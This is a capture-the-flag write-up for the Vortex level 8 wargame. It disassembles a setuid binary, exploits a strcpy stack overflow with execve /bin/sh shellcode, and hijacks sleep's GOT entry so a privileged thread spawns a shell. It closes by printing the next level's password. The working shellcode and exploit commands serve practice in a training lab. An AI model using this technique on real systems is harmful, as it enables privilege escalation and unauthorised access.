Dump of assembler code for function main:
```assembly
   0x080486b8 <+0>:     push   ebp
   0x080486b9 <+1>:     mov    ebp,esp
   0x080486bb <+3>:     push   esi
   0x080486bc <+4>:     push   ebx
   0x080486bd <+5>:     and    esp,0xfffffff0
   0x080486c0 <+8>:     sub    esp,0x20
   0x080486c3 <+11>:    mov    DWORD PTR [esp+0xc],0x0
   0x080486cb <+19>:    mov    DWORD PTR [esp+0x8],0x804865d		# safecode function
   0x080486d3 <+27>:    mov    DWORD PTR [esp+0x4],0x0
   0x080486db <+35>:    lea    eax,[esp+0x1c]				# esp+0x1c = pthread_t struct
   0x080486df <+39>:    mov    DWORD PTR [esp],eax
   0x080486e2 <+42>:    call   0x8048550 <pthread_create@plt>		# create a new thread
   0x080486e7 <+47>:    call   0x8048530 <getgid@plt>			# returns the real group ID of the calling process
   0x080486ec <+52>:    mov    esi,eax					# esi
   0x080486ee <+54>:    call   0x8048530 <getgid@plt>
   0x080486f3 <+59>:    mov    ebx,eax					# ebx
   0x080486f5 <+61>:    call   0x8048530 <getgid@plt>			
   0x080486fa <+66>:    mov    DWORD PTR [esp+0xc],esi
   0x080486fe <+70>:    mov    DWORD PTR [esp+0x8],ebx
   0x08048702 <+74>:    mov    DWORD PTR [esp+0x4],eax			
   0x08048706 <+78>:    mov    DWORD PTR [esp],0xaa
   0x0804870d <+85>:    call   0x8048540 <syscall@plt>			# syscall --> sets effective, real and saved user id of (eax, ebx, esi)
   0x08048712 <+90>:    call   0x80484f0 <getuid@plt>			# which are all gid
   0x08048717 <+95>:    mov    esi,eax
   0x08048719 <+97>:    call   0x80484f0 <getuid@plt>			#get user id
   0x0804871e <+102>:   mov    ebx,eax
   0x08048720 <+104>:   call   0x80484f0 <getuid@plt>
   0x08048725 <+109>:   mov    DWORD PTR [esp+0xc],esi
   0x08048729 <+113>:   mov    DWORD PTR [esp+0x8],ebx
   0x0804872d <+117>:   mov    DWORD PTR [esp+0x4],eax
   0x08048731 <+121>:   mov    DWORD PTR [esp],0xa4
   0x08048738 <+128>:   call   0x8048540 <syscall@plt>			# syscall --> set hostname by inputing user id
   0x0804873d <+133>:   mov    eax,DWORD PTR [ebp+0xc]			
   0x08048740 <+136>:   add    eax,0x4
   0x08048743 <+139>:   mov    eax,DWORD PTR [eax]			# eax = argv[1]
   0x08048745 <+141>:   mov    DWORD PTR [esp],eax			# push argv[1]
   0x08048748 <+144>:   call   0x8048698 <unsafecode>			# unsafecode(argv[1]_
   0x0804874d <+149>:   mov    eax,0x0
   0x08048752 <+154>:   lea    esp,[ebp-0x8]
   0x08048755 <+157>:   pop    ebx
   0x08048756 <+158>:   pop    esi
   0x08048757 <+159>:   pop    ebp
   0x08048758 <+160>:   ret
```
Dump of assembler code for function unsafecode:
```assembly
   0x08048698 <+0>:     push   ebp
   0x08048699 <+1>:     mov    ebp,esp
   0x0804869b <+3>:     sub    esp,0x418				# allocate 0x418 = 1048
   0x080486a1 <+9>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486a4 <+12>:    mov    DWORD PTR [esp+0x4],eax
   0x080486a8 <+16>:    lea    eax,[ebp-0x408]
   0x080486ae <+22>:    mov    DWORD PTR [esp],eax
   0x080486b1 <+25>:    call   0x8048500 <strcpy@plt>			# strcpy(local_buffer, argv[1])
   0x080486b6 <+30>:    leave  
   0x080486b7 <+31>:    ret    
```
Dump of assembler code for function safecode:
```assembly
   0x0804865d <+0>:     push   %ebp
   0x0804865e <+1>:     mov    %esp,%ebp
   0x08048660 <+3>:     sub    $0x28,%esp
   0x08048663 <+6>:     movl   $0x0,-0xc(%ebp)
   0x0804866a <+13>:    mov    -0xc(%ebp),%eax
   0x0804866d <+16>:    mov    %eax,0x4(%esp)
   0x08048671 <+20>:    movl   $0x80487f0,(%esp)
   0x08048678 <+27>:    call   0x80484c0 <printf@plt>
   0x0804867d <+32>:    mov    0x804a040,%eax
   0x08048682 <+37>:    mov    %eax,(%esp)
   0x08048685 <+40>:    call   0x80484d0 <fflush@plt>
   0x0804868a <+45>:    movl   $0x1,(%esp)
   0x08048691 <+52>:    call   0x80484e0 <sleep@plt>
   0x08048696 <+57>:    jmp    0x804866a <safecode+13>
```
and a better way to look at it:
```c
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
 
void *safecode(void *handle) {
    while(1) {
        int var = 0;
        printf("%d\n", var);
        fflush(stdout);
        sleep(1);
    }
}
```
simply enough, it seems like a simple buffer overflow, let's try:  
r $(python -c 'print "a"*1048') --> segmentation fault 0x61616161 --> it works  
r $(python -c 'print "a"*1036+"bbbb"') --> segmentation fault 0x62626262 --> now lets append a shellcode and try an address...  
r $(python -c 'print "a"*1036+"bbbb"+"\x90" * 64+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')  
so we put 0xffffd2a0:  
./vortex8 $(python -c 'print "a"*1036+"\xb0\xd2\xff\xff"+"\x90" * 64+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')  

and you thought it was so easy... the catch is we're still vortex8 (remember the part where the syscall was?):  
$ whoami
vortex8
so, we need to figure out a different way...  
we must somehow make the thread activate the shell, because the main function lacks the privliges...  
OK, so we will use a method we previously used in the vortex series: function hijacking  
Dump of assembler code for function sleep@plt:
```assembly
   0x080484e0 <+0>:     jmp    *0x804a014
   0x080484e6 <+6>:     push   $0x10
   0x080484eb <+11>:    jmp    0x80484b0
```
so we need to overwrite: 0x80484e2  
0x80484e2 <sleep@plt+2>:        0x0804a014  
export EGG
EGG=$(python -c 'print "\x90"*64 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')
and we want to change its value to the value of the address 0xffffd920 (env var named EGG with shell in it)
thus, we need to change the shellcode in our buffer so that it will write 0xffffd920 to 0x804a014
assembly code:
```assembly
section .text                                                                
global main                                                                  
                                                                             
main:                                                                        
        mov ebx, DWORD 0x0804a014                                                                                                  
        mov [ebx], DWORD 0xffffd920
	jmp main
```
compile it and objdump the file to get:  
Disassembly of section .text:
```assembly
08048060 <main>:
 8048060:       bb 14 a0 04 08          mov    $0x804a014,%ebx
 8048065:       c7 03 20 d9 ff ff       movl   $0xffffd94b,(%ebx)
		eb f3			jmp main
```
--> \xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3
so now we replace the shellcode with the following... (note: I had to change the return address to 0xffffd860, because I had to restart the session
and as a result the adresses changed a lot...)
/vortex/vortex8 $(python -c 'print "a"*1036+"\x60\xd8\xff\xff"+"\x90" * 64 + "\xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3"')

at last, we get:
$ whoami
vortex9
$ cat /etc/vortex_pass/vortex9
ci41)GJhb
